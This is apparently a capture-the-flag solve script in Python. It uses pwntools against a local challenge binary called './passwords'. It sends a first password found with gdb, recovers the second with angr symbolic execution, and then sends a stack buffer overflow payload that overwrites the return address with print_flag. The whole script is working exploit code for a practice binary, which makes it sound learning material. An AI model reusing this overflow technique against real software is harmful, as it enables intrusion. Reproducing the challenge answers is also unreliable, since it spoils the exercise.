# Original Script by Kayla P.
# Modified for challenge update

#!/usr/bin/env python3
from pwn import *
import sys
import angr
import claripy

e = ELF('./passwords')
r = process('./passwords')
binary_name = './passwords'

addr = (e.symbols['print_flag'])

print(r.recvuntil('first password'))

#found by using gdb
print("Sending 1804289383...")
r.sendline('1804289383')
print(r.recvuntil('second password'))

r.recvline()

#find with angr
print("Using angr...")

#start of second_password
addr_start = 0x4011f7
#start of final_password
addr_succ  = 0x401196

proj = angr.Project(binary_name, load_options={'auto_load_libs': False})
initial_state = proj.factory.blank_state(addr=addr_start)

#5*8
a = claripy.BVS('a', 40)
initial_state.regs.rdx = claripy.BVV(0x14, 40)
initial_state.regs.rsi = claripy.BVV(0, 40)
initial_state.regs.rdi = a

# PW is 4081368827
initial_state.solver.add(a > 2000000000) # constraint from binary
initial_state.solver.add(a < 4294967295) # max value of unsigned int
simgr = proj.factory.simulation_manager(initial_state)
simgr.explore(find=addr_succ, avoid=0x401392)

for result in simgr.found:
	print(result) 

found = simgr.found[0]

print("PASSWORD TWO ISSSS ")
print(str(found.solver.eval(a)))

password_two = found.solver.eval(a)

r.sendline(str(password_two))

print(r.recvuntil('final password?'))
r.recvline()

#time to overflow
print("Sending payload (overflow followed by address of print_flag)...")
payload = (b'A'*24 + p64(addr))
r.sendline(payload)

print(r.recvuntil("Here is your flag: "))
r.recvline()
print(r.recvline())
